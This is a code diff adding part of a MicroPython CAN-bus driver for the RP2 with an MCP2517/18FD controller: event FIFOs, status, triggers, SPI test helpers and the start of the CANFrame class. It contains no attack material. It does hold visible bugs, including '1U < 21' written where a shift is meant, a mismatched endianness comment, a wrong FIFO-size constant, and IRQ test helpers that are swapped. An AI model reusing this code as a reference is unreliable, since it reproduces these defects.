+STATIC TIME_CRITICAL void pop_tx_event(rp2_can_obj_t *self, mp_obj_list_t *list, uint32_t i)
+{
+    // This must be called with interrupts disabled
+
+    // Pop the front of the transmit event FIFO
+    self->event_fifo.free++;
+    uint8_t idx = self->event_fifo.head_idx++;
+    if (self->event_fifo.head_idx == TX_EVENT_FIFO_SIZE) {
+        self->event_fifo.head_idx = 0;
+    }
+
+    // Create a new event object (a tuple of event type, tag and timestamp)
+    mp_obj_tuple_t *event = mp_obj_new_tuple(3U, NULL);
+
+    event->items[0] = mp_obj_new_int_from_uint(self->event_fifo.events[idx].event_type);
+    event->items[1] = mp_obj_new_int_from_uint(self->event_fifo.events[idx].info.generic);
+    event->items[2] = mp_obj_new_int_from_uint(self->event_fifo.events[idx].timestamp);
+
+    // This event is the i'th entry in the tuple of events being returned
+    list->items[i] = event;
+}
+
+// Pop a transmit event (if there's room) into a buffer that has n bytes spare
+STATIC TIME_CRITICAL uint32_t pop_tx_event_as_bytes(rp2_can_obj_t *self, uint8_t *buf, uint32_t n)
+{
+    // This must be called with interrupts disabled
+
+    // Transmit event is:
+    // Byte 0: flags, bit 7 = overflow indicator (bytes 1-8 undefined)
+    // Bytes 1-4: tag (in little endian format)
+    // Bytes 5-8: timestamp (in little endian format)
+
+    // Transmit event is exactly 9 bytes
+    if (n >= 9U) {
+        // Pop the front of the transmit event FIFO
+        self->event_fifo.free++;
+        uint8_t idx = self->event_fifo.head_idx++;
+        if (self->event_fifo.head_idx == TX_EVENT_FIFO_SIZE) {
+            self->event_fifo.head_idx = 0;
+        }
+
+        // Access the relevant parameter via a generic union member
+        uint32_t generic = self->event_fifo.events[idx].info.generic;
+        uint32_t timestamp = self->event_fifo.events[idx].timestamp;
+
+        // Set flags for the type of event
+        buf[0] = self->event_fifo.events[idx].event_type;
+
+        BIG_ENDIAN_BUF(buf + 1U, generic);
+        BIG_ENDIAN_BUF(buf + 5U, timestamp);
+        return NUM_EVENT_BYTES;
+    }
+    else {
+        return 0;
+    }
+}
+
+STATIC mp_obj_t rp2_can_recv_tx_events(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            {MP_QSTR_limit,    MP_ARG_KW_ONLY | MP_ARG_INT, {.u_int = TX_EVENT_FIFO_SIZE}},
+            {MP_QSTR_as_bytes, MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+    };
+
+    rp2_can_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    // tx_event_fifo.free is safe to access outside the ISR because it's an atomic word and can only decrease so num_events can only increase
+    uint32_t num_events = TX_EVENT_FIFO_SIZE - self->event_fifo.free;
+    uint32_t limit = args[0].u_int;
+    bool as_bytes = args[1].u_bool;
+
+    if (limit > num_events) {
+        limit = num_events;
+    }
+
+    if (as_bytes) {
+        uint8_t buf[128];
+        size_t remaining = sizeof(buf);
+        size_t n = 0;
+
+        // Pull events from the FIFO up to a limit
+        for (uint32_t i = 0; i < limit; i++) {
+            CAN_ASSERT(!irq_locked, "AA")
+            DISABLE_GPIO_INTERRUPTS();
+            size_t added = pop_tx_event_as_bytes(self, buf + n, remaining);
+            ENABLE_GPIO_INTERRUPTS();
+            if (added) {
+                n += added;
+                remaining -= added;
+            }
+            else {
+                break;
+            }
+        }
+        // Return bytes for the block of transmit events (might be zero)
+        return make_mp_bytes(buf, n);
+    }
+    else {
+        // Events that will be pulled are the minimum of the limit or the number of events in the TX event FIFO
+        // Will return an empty tuple constant if there are no events
+        mp_obj_list_t *list = mp_obj_new_list(limit, NULL);
+
+        // Pull events from the FIFO up to a limit
+        for (uint32_t i = 0; i < limit; i++) {
+            CAN_ASSERT(!irq_locked, "AB")
+            DISABLE_GPIO_INTERRUPTS();
+            pop_tx_event(self, list, i);
+            ENABLE_GPIO_INTERRUPTS();
+        }
+        return list;
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_can_recv_tx_events_obj, 1, rp2_can_recv_tx_events);
+
+// Return number of events waiting in the TX event FIFO.`
+STATIC mp_obj_t rp2_can_recv_tx_events_pending(mp_obj_t self_in)
+{
+    rp2_can_obj_t *self = self_in;
+
+    // It's OK to access this with interrupt concurrency because it's an atomic word
+    uint32_t n = RX_FIFO_SIZE - self->event_fifo.free;
+
+    return MP_OBJ_NEW_SMALL_INT(n);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_recv_tx_events_pending_obj, rp2_can_recv_tx_events_pending);
+
+// Return number of messages waiting in the RX FIFO.
+STATIC mp_obj_t rp2_can_get_status(mp_obj_t self_in)
+{
+    // Not used
+    // rp2_can_obj_t *self = self_in;
+    uint32_t trec = mcp251718fd_get_trec();
+
+    // Returns a tuple of:
+    // bool: is Bus-off
+    // bool: is Error Passive
+    // int: TEC
+    // int: REC
+    mp_obj_tuple_t *tuple = mp_obj_new_tuple(4U, NULL);
+    tuple->items[0] = (trec & (1U < 21)) ? mp_const_true : mp_const_false;
+    tuple->items[1] = (trec & (3U << 19)) ? mp_const_true : mp_const_false;
+    tuple->items[2] = MP_OBJ_NEW_SMALL_INT((trec >> 8) & 0xffU);
+    tuple->items[3] = MP_OBJ_NEW_SMALL_INT(trec & 0xffU);
+
+    return tuple;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_get_status_obj, rp2_can_get_status);
+
+// Return the timestamp counter
+// (Typically used to convert timestamps to time-of-day)
+STATIC mp_obj_t rp2_can_get_time(mp_obj_t self_in)
+{
+    // Not used
+    // rp2_can_obj_t *self = self_in;
+
+    return mp_obj_new_int_from_uint(mcp251718fd_get_timebase());
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_get_time_obj, rp2_can_get_time);
+
+// Return the timestamp counter resolution in ticks per second
+STATIC mp_obj_t rp2_can_get_time_hz(mp_obj_t self_in)
+{
+    // Not used
+    // rp2_can_obj_t *self = self_in;
+
+    return mp_obj_new_int_from_uint(1000000U);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_get_time_hz_obj, rp2_can_get_time_hz);
+
+// Return number of frame slots free in the transmit or FIFO queues
+STATIC mp_obj_t rp2_can_get_send_space(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_fifo,    MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+    };
+
+    rp2_can_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    bool fifo = args[0].u_bool;
+
+    return fifo ? MP_OBJ_NEW_SMALL_INT(self->tx_fifo.num_free_slots) : MP_OBJ_NEW_SMALL_INT(self->tx_queue.num_free_slots);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_can_get_send_space_obj, 1, rp2_can_get_send_space);
+
+// Set the conditions for triggering an edge on the trigger pin
+STATIC mp_obj_t rp2_can_set_trigger(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            {MP_QSTR_on_error,      MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+            {MP_QSTR_on_canid,      MP_ARG_KW_ONLY | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},   // A specific CAN ID
+            {MP_QSTR_as_bytes,      MP_ARG_KW_ONLY | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},   // A block of bytes
+    };
+
+    rp2_can_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    bool on_error = args[0].u_bool;
+    rp2_canid_obj_t *on_canid = args[1].u_obj;
+    mp_obj_t as_bytes = args[2].u_obj;
+
+    if (as_bytes != MP_OBJ_NULL) {
+        // Trigger can be set directly but the ID trigger is then not valid
+        if (!MP_OBJ_IS_STR_OR_BYTES(as_bytes)) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "Trigger must be bytes"));
+        }
+        if (on_canid != MP_OBJ_NULL) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Cannot set a binary trigger and an ID trigger"));
+        }
+
+        uint8_t trigger_buf[27];
+        uint32_t len = (uint8_t)copy_mp_bytes(as_bytes, (uint8_t *)trigger_buf, sizeof(trigger_buf));
+        if (len != sizeof(trigger_buf)) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Trigger must be %d bytes", sizeof(trigger_buf)));
+        }
+        self->triggers[0].on_error = (trigger_buf[0] & 0x80U) != 0;
+
+        uint8_t *can_payload_mask = (uint8_t *)self->triggers[0].can_payload_mask;
+        uint8_t *can_payload_match = (uint8_t *)self->triggers[0].can_payload_match;
+        for (uint8_t i = 0; i < 8U; i++) {
+            can_payload_mask[i] = trigger_buf[i + 11U];
+            can_payload_match[i] = trigger_buf[i + 19U];
+        }
+        self->triggers[0].can_dlc_mask = trigger_buf[9];
+        self->triggers[0].can_dlc_match = trigger_buf[10];
+        self->triggers[0].can_id_mask = BIG_ENDIAN_WORD(trigger_buf + 1U);
+        self->triggers[0].can_id_match = BIG_ENDIAN_WORD(trigger_buf + 5U);
+
+        self->triggers[0].on_rx = true;
+        self->triggers[0].enabled = true;
+    }
+    else if (on_canid != MP_OBJ_NULL) {
+        if (!MP_OBJ_IS_TYPE(on_canid, &rp2_canid_type)) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "on_canid must be of type CANID"));
+        }
+        if (as_bytes != MP_OBJ_NULL) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Cannot set an ID trigger and a binary trigger"));
+        }
+        // Set masks to allow all payloads and sizes
+        self->triggers[0].can_payload_match[0] = 0;
+        self->triggers[0].can_payload_match[1] = 0;
+        self->triggers[0].can_payload_mask[0] = 0;
+        self->triggers[0].can_payload_mask[1] = 0;
+        self->triggers[0].can_dlc_match = 0;
+        self->triggers[0].can_dlc_mask = 0;
+        // Set ID trigger
+        self->triggers[0].can_id_mask = 0xffffffffU;
+        self->triggers[0].can_id_match = on_canid->can_id;
+
+        self->triggers[0].on_rx = true;
+        self->triggers[0].enabled = true;
+    }
+    else {
+        if (on_error) {
+            self->triggers[0].on_error = on_error;
+            self->triggers[0].enabled = true;
+        }
+    }
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_can_set_trigger_obj, 1, rp2_can_set_trigger);
+
+// Clear the trigger from operating
+STATIC mp_obj_t rp2_can_clear_trigger(mp_obj_t self_in)
+{
+    rp2_can_obj_t *self = self_in;
+
+    self->triggers[0].enabled = false;
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_clear_trigger_obj, rp2_can_clear_trigger);
+
+// Put a pulse on the trigger pin
+STATIC mp_obj_t rp2_can_pulse_trigger(mp_obj_t self_in)
+{
+    // Not used
+    // rp2_can_obj_t *self = self_in;
+
+    // Ensure pulse is long enough for even a slow logic analyzer (e.g. 20MHz) to see
+    TRIG_SET();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    NOP();
+    TRIG_CLEAR();
+    
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_pulse_trigger_obj, rp2_can_pulse_trigger);
+
+//////////////////////////////////////// TEST FUNCTIONS /////////////////////////////////////////
+
+STATIC mp_obj_t rp2_can_test_irq_init(void)
+{
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Enabling GPIO IRQ\n");
+    gpio_set_irq_enabled(SPI_IRQ_GPIO, EDGE_SENSITIVE_RISING, true);
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Enabled GPIO IRQ and vector\n");
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Set IRQ handler\n");
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "IRQ enabled\n");
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_0(rp2_can_test_irq_init_fun_obj, rp2_can_test_irq_init);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_irq_init_obj, MP_ROM_PTR(&rp2_can_test_irq_init_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_irq_enable(void)
+{
+    DISABLE_GPIO_INTERRUPTS();
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "DISABLE_GPIO_INTERRUPTS() called\n");
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_0(rp2_can_test_irq_enable_fun_obj, rp2_can_test_irq_enable);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_irq_enable_obj, MP_ROM_PTR(&rp2_can_test_irq_enable_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_irq_disable(void)
+{
+    ENABLE_GPIO_INTERRUPTS();
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "ENABLE_GPIO_INTERRUPTS() called\n");
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_0(rp2_can_test_irq_disable_fun_obj, rp2_can_test_irq_disable);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_irq_disable_obj, MP_ROM_PTR(&rp2_can_test_irq_disable_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_init(void)
+{
+    DISABLE_GPIO_INTERRUPTS();
+    pico_pin_init();
+    ENABLE_GPIO_INTERRUPTS();
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "VTOR=0x%08"PRIx32"\n", scb_hw->vtor);
+    for(int i = -16; i < 0x40; i++) {
+        CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "VTOR[%d]=0x%08"PRIx32"\n", i, vtor[i + 16]);
+    }
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_0(rp2_can_test_spi_init_fun_obj, rp2_can_test_spi_init);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_init_obj, MP_ROM_PTR(&rp2_can_test_spi_init_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_set(void)
+{
+    SPI_SELECT();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_0(rp2_can_test_spi_set_fun_obj, rp2_can_test_spi_set);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_set_obj, MP_ROM_PTR(&rp2_can_test_spi_set_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_deselect(void)
+{
+    SPI_DESELECT();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_0(rp2_can_test_spi_deselect_fun_obj, rp2_can_test_spi_deselect);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_deselect_obj, MP_ROM_PTR(&rp2_can_test_spi_deselect_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_write_word(mp_obj_t addr_obj, mp_obj_t word_obj)
+{
+    uint32_t addr = mp_obj_get_int(addr_obj);
+    uint32_t word = mp_obj_get_int(word_obj);
+
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Writing word=0x%08"PRIx32"\n", word);
+    DISABLE_GPIO_INTERRUPTS();
+    mcp251718fd_spi_write_word(addr | 0x2000, word);
+    ENABLE_GPIO_INTERRUPTS();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_2(rp2_can_test_spi_write_word_fun_obj, rp2_can_test_spi_write_word);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_write_word_obj, MP_ROM_PTR(&rp2_can_test_spi_write_word_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_read_word(mp_obj_t addr_obj)
+{
+    uint32_t addr = mp_obj_get_int(addr_obj);
+
+    DISABLE_GPIO_INTERRUPTS();
+    uint32_t result = mcp251718fd_spi_read_word(addr);
+    ENABLE_GPIO_INTERRUPTS();
+
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Read word=0x%08"PRIx32"\n", result);
+    return mp_obj_new_int_from_ull(result);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_test_spi_read_word_fun_obj, rp2_can_test_spi_read_word);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_read_word_obj, MP_ROM_PTR(&rp2_can_test_spi_read_word_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_read_words(mp_obj_t addr_obj)
+{
+    uint32_t words[4];
+    uint32_t addr = mp_obj_get_int(addr_obj);
+
+    DISABLE_GPIO_INTERRUPTS();
+    mcp251718fd_spi_read_words(addr, words, 4U);
+    ENABLE_GPIO_INTERRUPTS();
+
+    mp_obj_tuple_t *tuple = mp_obj_new_tuple(4U, NULL);
+    tuple->items[0] = mp_obj_new_int_from_ull(words[0]);
+    tuple->items[1] = mp_obj_new_int_from_ull(words[1]);
+    tuple->items[2] = mp_obj_new_int_from_ull(words[2]);
+    tuple->items[3] = mp_obj_new_int_from_ull(words[3]);
+
+    return tuple;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_test_spi_read_words_fun_obj, rp2_can_test_spi_read_words);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_read_words_obj, MP_ROM_PTR(&rp2_can_test_spi_read_words_fun_obj));
+
+STATIC mp_obj_t rp2_can_test_spi_write_words(mp_obj_t addr_obj)
+{
+    uint32_t addr = mp_obj_get_int(addr_obj);
+    uint32_t words[4] = {0xdeadbeefU, 0xcafef00dU, 0x01e551caU, 0x01020304U};
+
+    DISABLE_GPIO_INTERRUPTS();
+    mcp251718fd_spi_write_4words(addr, words);
+    ENABLE_GPIO_INTERRUPTS();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_test_spi_write_words_fun_obj, rp2_can_test_spi_write_words);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_can_test_spi_write_words_obj, MP_ROM_PTR(&rp2_can_test_spi_write_words_fun_obj));
+
+
+STATIC void rp2_can_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind)
+{
+     rp2_can_obj_t *self = self_in;
+
+    uint32_t trec = mcp251718fd_get_trec();
+    uint32_t timebase = mcp251718fd_get_timebase();
+    uint32_t tec = (trec >> 8) & 0xffU;
+    uint32_t rec = trec & 0xffU;
+
+    // Show the bus off status, the error passive status, TEC, REC, the time, and the baud rate settings
+    mp_printf(print, "CAN(mode=");
+    if (self->mode == CAN_MODE_OFFLINE) {
+        mp_printf(print, "CAN_MODE_OFFLINE");
+    }
+    else if (self->mode == CAN_MODE_ACK_ONLY) {
+        mp_printf(print, "CAN_MODE_ACK_ONLY");
+    }
+    else if (self->mode == CAN_MODE_LISTEN_ONLY) {
+        mp_printf(print, "CAN_MODE_LISTEN_ONLY");
+    }
+    else if (self->mode == CAN_MODE_NORMAL) {
+        mp_printf(print, "CAN_MODE_NORMAL");
+    }
+    else {
+        mp_printf(print, "?");
+    }
+    if (self->recv_errors) {
+        mp_printf(print, ", recv_errors=True");
+    }
+
+    mp_printf(print, ", time=%lu, TEC=%d, REC=%d", timebase, tec, rec);
+
+    // Error states
+    if (trec & (1U < 21))  {
+        mp_printf(print, ", Bus Off");
+    }
+    if (trec & (3U << 19)) {
+        mp_printf(print, ", Error Passive");
+    }
+    if (trec & (1U << 16)) {
+        mp_printf(print, ", Warn");
+    }
+
+    mp_printf(print, ")");
+}
+
+STATIC const mp_map_elem_t rp2_can_locals_dict_table[] = {
+    ////// Instance methods
+    { MP_OBJ_NEW_QSTR(MP_QSTR_send_frame), (mp_obj_t)&rp2_can_send_frame_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_send_frames), (mp_obj_t)&rp2_can_send_frames_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_recv), (mp_obj_t)&rp2_can_recv_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_recv_pending), (mp_obj_t)&rp2_can_recv_pending_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_recv_tx_events), (mp_obj_t)&rp2_can_recv_tx_events_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_recv_tx_events_pending), (mp_obj_t)&rp2_can_recv_tx_events_pending_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_status), (mp_obj_t)&rp2_can_get_status_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_send_space), (mp_obj_t)&rp2_can_get_send_space_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_time), (mp_obj_t)&rp2_can_get_time_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_time_hz), (mp_obj_t)&rp2_can_get_time_hz_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_set_trigger), (mp_obj_t)&rp2_can_set_trigger_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_clear_trigger), (mp_obj_t)&rp2_can_clear_trigger_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_pulse_trigger), (mp_obj_t)&rp2_can_pulse_trigger_obj },
+
+    ////// Static methods
+    // Test methods
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_irq_init), (mp_obj_t)&rp2_can_test_irq_init_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_irq_enable), (mp_obj_t)&rp2_can_test_irq_enable_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_irq_disable), (mp_obj_t)&rp2_can_test_irq_disable_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_init), (mp_obj_t)&rp2_can_test_spi_init_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_set), (mp_obj_t)&rp2_can_test_spi_set_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_deselect), (mp_obj_t)&rp2_can_test_spi_deselect_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_write_word), (mp_obj_t)&rp2_can_test_spi_write_word_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_read_word), (mp_obj_t)&rp2_can_test_spi_read_word_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_read_words), (mp_obj_t)&rp2_can_test_spi_read_words_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_test_spi_write_words), (mp_obj_t)&rp2_can_test_spi_write_words_obj },
+
+    ////// Class constants
+    // Pre-defined bit rates
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_500K_75), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_500K_75) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_250K_75), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_250K_75) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_125K_75), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_125K_75) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_1M_75), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_1M_75) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_500K_50), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_500K_50) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_250K_50), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_250K_50) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_125K_50), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_125K_50) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_1M_50), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_1M_50) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_2M_50), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_2M_50) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_4M_90), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_4M_90) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_2_5M_75), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_2_5M_75) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_BITRATE_2M_80), MP_OBJ_NEW_SMALL_INT(CAN_BITRATE_2M_80) },
+
+    // Mode constants
+    { MP_OBJ_NEW_QSTR(MP_QSTR_NORMAL), MP_OBJ_NEW_SMALL_INT(CAN_MODE_NORMAL) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_LISTEN_ONLY), MP_OBJ_NEW_SMALL_INT(CAN_MODE_LISTEN_ONLY) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_ACK_ONLY), MP_OBJ_NEW_SMALL_INT(CAN_MODE_ACK_ONLY) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_OFFLINE), MP_OBJ_NEW_SMALL_INT(CAN_MODE_OFFLINE) },
+
+    // Configuration constants
+    { MP_OBJ_NEW_QSTR(MP_QSTR_RX_FIFO_SIZE), MP_OBJ_NEW_SMALL_INT(RX_FIFO_SIZE) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_TX_FIFO_SIZE), MP_OBJ_NEW_SMALL_INT(MCP251718FD_TX_FIFO_SIZE) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_TX_QUEUE_SIZE), MP_OBJ_NEW_SMALL_INT(MCP251718FD_TX_QUEUE_SIZE) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_TX_EVENT_FIFO_SIZE), MP_OBJ_NEW_SMALL_INT(TX_EVENT_FIFO_SIZE) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_EVENT_TYPE_OVERFLOW), MP_OBJ_NEW_SMALL_INT(EVENT_TYPE_OVERFLOW) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_EVENT_TYPE_CAN_ERROR), MP_OBJ_NEW_SMALL_INT(EVENT_TYPE_CAN_ERROR) },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_EVENT_TYPE_TRANSMITTED_FRAME), MP_OBJ_NEW_SMALL_INT(EVENT_TYPE_TRANSMITTED_FRAME) },
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_can_locals_dict, rp2_can_locals_dict_table);
+
+const mp_obj_type_t rp2_can_type = {
+    { &mp_type_type },
+    .name = MP_QSTR_CAN,
+    .print = rp2_can_print,
+    .make_new = rp2_can_make_new,
+    .locals_dict = (mp_obj_t)&rp2_can_locals_dict,
+};
+////////////////////////////////////// End of CAN class //////////////////////////////////////
+
+////////////////////////////////// Start of CANFrame class ///////////////////////////////////
+STATIC mp_obj_t rp2_canframe_make_new(const mp_obj_type_t *type, mp_uint_t n_args, mp_uint_t n_kw, const mp_obj_t *all_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_canid,     MP_ARG_REQUIRED | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+        {MP_QSTR_data,      MP_ARG_KW_ONLY | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+        {MP_QSTR_remote,    MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+        {MP_QSTR_tag,       MP_ARG_KW_ONLY | MP_ARG_INT, {.u_int = 0}},
+        {MP_QSTR_dlc,       MP_ARG_KW_ONLY | MP_ARG_INT, {.u_int = -1}},
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all_kw_array(n_args, n_kw, all_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    rp2_canid_obj_t *canid = args[0].u_obj;
+    mp_obj_t data = args[1].u_obj;
+    bool remote = args[2].u_bool;
+    uint32_t tag = args[3].u_int;
+    bool dlc_set = args[4].u_int != -1;
+    uint8_t dlc = args[4].u_int;
+
+    if (!MP_OBJ_IS_TYPE(canid, &rp2_canid_type)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "canid must be of type CANID"));
+    }
+    if (dlc_set && dlc > 15) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "dlc must be 0..15"));
+    }
+    if (dlc_set && !remote && data == MP_OBJ_NULL && dlc > 0) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "dlc must be 0 if no payload"));
+    }
+
+    rp2_canframe_obj_t *self = m_new_obj(rp2_canframe_obj_t);
+    self->base.type = &rp2_canframe_type;
+
+    self->remote = remote;
+    if(data == MP_OBJ_NULL) {
+        if (remote) {
+            self->dlc = dlc_set ? dlc : 0;
+        }
+        else {
+            self->dlc = 0;
+        }
+    }
+    else {
+        uint32_t buf[2];
+        if(remote) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Remote frames cannot have a payload"));
+        }
+        uint8_t len = (uint8_t)copy_mp_bytes(data, (uint8_t *)buf, 8U);
+        // If there are insufficient bytes to match the DLC then this is an error
+        if (dlc_set && len < 8U && dlc > len) {
